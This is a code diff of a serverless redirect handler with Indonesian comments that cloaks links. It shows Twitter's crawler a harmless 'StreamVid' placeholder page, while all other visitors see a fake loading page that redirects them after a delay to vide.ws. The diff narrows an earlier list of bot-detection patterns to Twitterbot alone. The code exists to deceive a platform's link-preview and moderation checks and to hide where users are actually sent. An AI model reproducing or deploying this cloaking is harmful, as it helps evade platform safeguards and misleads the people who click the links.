@@ -5,45 +5,29 @@ export async function onRequest(context) {
     const path = url.pathname;
     const host = request.headers.get('host');
     
-    // ADVANCED BOT DETECTION
-    const userAgent = request.headers.get('user-agent') || '';
-    const accept = request.headers.get('accept') || '';
-    
-    const isTwitterBot = userAgent.includes('Twitterbot');
-    const isOtherBot = detectOtherBots(userAgent, accept);
-    
-    console.log(`🤖 Bot Detection - Twitter: ${isTwitterBot}, Other: ${isOtherBot}`);
+    console.log(`🔄 Processing: ${path} from ${host}`);
 
-    if (isTwitterBot || isOtherBot) {
-      // BOTS: Kasih SAFE CONTENT (NO REDIRECT)
-      console.log(`🛡️ Serving SAFE content to bot`);
+    // SIMPLE BOT DETECTION YANG WORK
+    const userAgent = request.headers.get('user-agent') || '';
+    console.log(`User-Agent: ${userAgent.substring(0, 100)}`);
+    
+    // HANYA Twitterbot yang dikasih safe content, lainnya redirect
+    const isTwitterBot = userAgent.includes('Twitterbot');
+    
+    if (isTwitterBot) {
+      console.log(`🛡️ Twitter bot detected - serving safe content`);
       return serveSafeContent(path, host);
     } else {
-      // HUMANS ONLY: Redirect dengan delay
-      console.log(`👤 Redirecting human user`);
-      return serveHumanRedirect(path, host);
+      console.log(`👤 Human user - redirecting`);
+      return serveHumanRedirect(path);
     }
   } catch (error) {
+    console.error('Error:', error);
     return new Response('Error', { status: 500 });
   }
 }
 
-// ===== ADVANCED BOT DETECTION =====
-function detectOtherBots(userAgent, accept) {
-  const botPatterns = [
-    /Twitterbot/i, /facebookexternalhit/i, /WhatsApp/i,
-    /TelegramBot/i, /Discordbot/i, /Slackbot/i,
-    /Googlebot/i, /Bingbot/i, /YandexBot/i,
-    /bot/i, /crawler/i, /spider/i, /monitoring/i
-  ];
-  
-  const isBotByUA = botPatterns.some(pattern => pattern.test(userAgent));
-  const hasSimpleAccept = accept.includes('*/*');
-  
-  return isBotByUA || hasSimpleAccept;
-}
-
-// ===== SAFE CONTENT FOR BOTS =====
+// ===== SAFE CONTENT UNTUK TWITTER BOT =====
 function serveSafeContent(path, host) {
   const pathId = path.split('/').pop() || 'content';
   
@@ -54,12 +38,9 @@ function serveSafeContent(path, host) {
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="StreamVid - Premium Video Content">
     <meta name="twitter:description" content="Watch high-quality video content on StreamVid platform">
-    <meta property="og:title" content="StreamVid - Video Platform">
-    <meta property="og:description" content="Premium video streaming service">
-    <meta property="og:url" content="https://${host}${path}">
     <style>
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            font-family: Arial, sans-serif;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             margin: 0;
@@ -72,65 +53,31 @@ function serveSafeContent(path, host) {
         }
         .container {
             background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px);
             padding: 40px;
             border-radius: 20px;
-            border: 1px solid rgba(255,255,255,0.2);
             max-width: 500px;
-        }
-        .logo { font-size: 3em; margin-bottom: 20px; }
-        h1 { margin-bottom: 10px; font-size: 1.8em; }
-        .content-id {
-            background: rgba(255,255,255,0.2);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-family: monospace;
-            margin: 15px 0;
-            display: inline-block;
-        }
-        .features {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            margin: 25px 0;
-        }
-        .feature {
-            background: rgba(255,255,255,0.1);
-            padding: 15px;
-            border-radius: 10px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="logo">🎬</div>
-        <h1>StreamVid Platform</h1>
+        <h1>🎬 StreamVid Platform</h1>
         <p>Premium Video Streaming Service</p>
-        
-        <div class="content-id">ID: ${pathId}</div>
-        
-        <div class="features">
-            <div class="feature">🔒 Secure</div>
-            <div class="feature">📱 Mobile</div>
-            <div class="feature">⚡ Fast</div>
-            <div class="feature">🌐 Global</div>
+        <div style="background: rgba(255,255,255,0.2); padding: 10px; border-radius: 10px; margin: 20px 0;">
+            Content ID: ${pathId}
         </div>
-        
-        <p>High-quality video content optimized for all devices</p>
+        <p>High-quality video content available</p>
     </div>
 </body>
 </html>`;
 
   return new Response(safeHtml, {
-    headers: { 
-      'Content-Type': 'text/html; charset=utf-8',
-      'Cache-Control': 'public, max-age=300'
-    }
+    headers: { 'Content-Type': 'text/html; charset=utf-8' }
   });
 }
 
-// ===== REDIRECT HANYA UNTUK HUMANS =====
-function serveHumanRedirect(path, host) {
+// ===== REDIRECT UNTUK SEMUA USER (KECUALI TWITTER BOT) =====
+function serveHumanRedirect(path) {
   // TARGET URL MAPPING
   let targetUrl;
   
@@ -142,87 +89,68 @@ function serveHumanRedirect(path, host) {
     const id = path.substring(3);
     targetUrl = `https://vide.ws/f/${id}`;
   }
+  else if (path.startsWith('/e/')) {
+    const id = path.substring(3);
+    targetUrl = `https://vide.ws/e/${id}`;
+  }
   else {
     targetUrl = 'https://vide.ws/';
   }
 
-  // REDIRECT DENGAN VERIFICATION STYLE (bukan instant)
+  console.log(`🎯 Redirecting to: ${targetUrl}`);
+
+  // SIMPLE REDIRECT PAGE YANG WORK
   const html = `<!DOCTYPE html>
 <html>
 <head>
-    <title>StreamVid - Verification</title>
+    <title>Redirecting...</title>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: #1a1a1a;
-            color: white;
+            background: #f5f5f5;
             font-family: Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            color: #333;
         }
-        .verification {
+        .loading {
             text-align: center;
-            padding: 40px;
-            background: #2a2a2a;
-            border-radius: 10px;
-            border: 1px solid #444;
+            padding: 20px;
         }
         .spinner {
-            border: 3px solid #333;
-            border-top: 3px solid #00ff88;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
             border-radius: 50%;
             width: 40px;
             height: 40px;
             animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
+            margin: 0 auto 15px;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .progress {
-            width: 200px;
-            height: 4px;
-            background: #333;
-            border-radius: 2px;
-            margin: 20px auto;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            background: #00ff88;
-            width: 0%;
-            animation: load 3s ease-in-out;
-        }
-        @keyframes load {
-            0% { width: 0%; }
-            100% { width: 100%; }
-        }
     </style>
 </head>
 <body>
-    <div class="verification">
+    <div class="loading">
         <div class="spinner"></div>
-        <h3>Verifying Access...</h3>
-        <p>Preparing your content securely</p>
-        
-        <div class="progress">
-            <div class="progress-bar"></div>
+        <div>Preparing your content...</div>
+        <div style="font-size: 12px; color: #666; margin-top: 10px;">
+            Redirecting to secure content...
         </div>
-        
-        <p style="font-size: 12px; color: #888; margin-top: 20px;">
-            This helps ensure content security
-        </p>
     </div>
     
     <script>
-        // REDIRECT SETELAH 3 DETIK (bukan instant)
+        console.log('Starting redirect to: ${targetUrl}');
+        // REDIRECT SETELAH 2 DETIK
         setTimeout(function() {
+            console.log('Executing redirect now');
             window.location.href = "${targetUrl}";
-        }, 3000);
+        }, 2000);
     </script>
 </body>
 </html>`;
